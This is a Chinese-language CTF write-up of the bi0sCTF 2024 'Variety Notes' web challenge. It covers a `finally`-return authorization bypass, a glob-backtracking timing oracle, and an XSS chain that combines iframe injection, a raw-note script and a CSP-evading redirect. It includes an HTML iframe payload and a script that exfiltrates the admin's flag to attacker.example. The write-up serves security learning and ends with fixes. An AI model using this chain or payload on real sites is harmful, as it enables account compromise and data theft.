# bi0sCTF 2024 - Variety Notes

## 题目简述

每个用户有独立 UUID 目录，笔记文件名为 `<sanitized-title>-<8-char-id>.txt`。管理员目录中存在标题为 `Flag` 的笔记，flag 本身在正文，随机 ID 则隐藏在文件名中。举报机器人登录管理员账号，并用用户提交的标题和正文创建、打开一篇管理员笔记。

解法先利用 `/search` 中 `finally` 覆盖 `return` 的控制流错误，无需管理员身份便对管理员目录执行任意 glob 模式；构造高复杂度通配符并测量响应时间，恢复 flag 笔记 ID。之后组合普通笔记页的 iframe 注入、攻击者 raw 笔记的 XSS，以及 `/share` 的服务端重定向绕过 CSP 路径限制，在管理员页面中读取 flag 正文。

## 解题过程

### `finally` 让权限和输入检查全部失效

搜索路由原本检查标题格式和管理员 UUID：

```javascript
async function searchNotes(searchTitle, userId, res) {
  try {
    if (!checkTitle(searchTitle)) return res.send("Invalid title");
    if (userId !== adminUUID) return res.send("Only admin can search");
  } finally {
    const notes = await filehound
      .create()
      .paths(`./notes/${adminUUID}`)
      .match(`*${searchTitle}*-*.txt`)
      .find();
    return res.render("search", { data: { ...notes, id: userId } });
  }
}
```

JavaScript 中 `finally` 里的 `return` 会覆盖 `try` 中已经准备返回的结果。于是普通用户也总会搜索管理员目录，而且即使 `searchTitle` 含本应被正则拒绝的 `*`，仍会进入 FileHound。

### 用通配符退化恢复 8 字符 ID

管理员 flag 文件名满足：

```text
Flag-<8-char-id>.txt
```

对已知前缀 `known` 和候选字符 `c`，官方 exploit 构造近似：

```python
search = "Flag-" + known + c + "*" * many
```

路由又在两端附加通配符，最终模式包含很长的连续 `*`。当 `known+c` 与真实文件名前缀一致时，匹配器会在许多等价的通配符分配之间回溯，完成连接明显变慢；前缀错误时则较早失败。

为避免 HTTP 客户端缓冲掩盖差异，官方脚本把准备好的请求通过原始 TCP 连接发送，先读取响应开头，再测量直到连接读完的耗时。超过约 2 秒的候选被视为命中。对字符集 `a-z0-9` 重复八轮即可恢复笔记 ID；阈值应根据本地或目标实例的基线重新校准，而不是固定照搬。

### 准备 raw XSS 与可保留的 iframe 注入

攻击者先创建一篇正文为内联脚本的笔记。普通查看页会经 DOMPurify 处理正文，但 `/:uuid/:noteid/raw` 对非管理员笔记直接返回原始内容，因此访问攻击者 raw URL 会执行脚本。

举报内容本身会成为管理员笔记正文。普通笔记页虽然净化正文，却显式把 `iframe` 加入允许标签，因此可提交：

```html
<iframe id="flag" name="flag" src="./RECOVERED_ID"></iframe>
<iframe src="./..ENCODED_ATTACKER_RAW_PATH/share"></iframe>
```

第一个 iframe 与当前管理员笔记同目录，因而加载 `/admin-uuid/<flag-id>`，其中就是 flag 笔记页面。

### 借 `/share` 重定向越过 CSP 路径

CSP 的 `default-src` 被限制为当前登录用户的目录前缀，即管理员会话下只允许 `APP/admin-uuid/`。第二个 iframe 因而先访问这一允许前缀内的 URL，并把攻击者 raw 路径中的 `/` 编码到 `noteid` 参数。

`/:uuid/:noteid/share` 会把该 `noteid` 原样拼进：

```javascript
res.redirect(`/shared/${sharedNoteId}`);
```

解码后的 `noteid` 含 `../attacker-uuid/<xss-id>/raw`，所以返回的 Location 经浏览器路径归一化后落到攻击者 raw 笔记。初始请求满足 CSP 的目录限制，而服务端重定向使最终 iframe 到达另一路径；这是题目所利用的 CSP path redirect 行为。

raw 页面中的脚本取得命名窗口：

```javascript
(async () => {
  const w = window.open("", "flag");
  await new Promise(resolve => setTimeout(resolve, 2000));
  location = "https://attacker.example/?f=" +
    encodeURIComponent(w.document.body.innerHTML);
})();
```

`flag` iframe 与 raw 页面同源，因此脚本可以读取其 DOM，并把 flag 正文回传。这里不需要共享管理员笔记：恢复出的 ID 与机器人当前的管理员 UUID 共同确定了目标路径。

## 方法总结

本题的第一条根因是控制流：`finally` 中返回响应，使权限和输入校验形同虚设；随后高复杂度 glob 把文件名前缀转换为时间 oracle。第二条链把三个不完整防护串在一起：净化器仍允许 iframe，raw 路由可执行攻击者脚本，服务端重定向又突破了 CSP 的路径约束。修复时应移除 `finally` 返回、对搜索模式做固定字符串转义，并彻底禁止用户原始 HTML 与可控重定向路径进入管理员上下文。
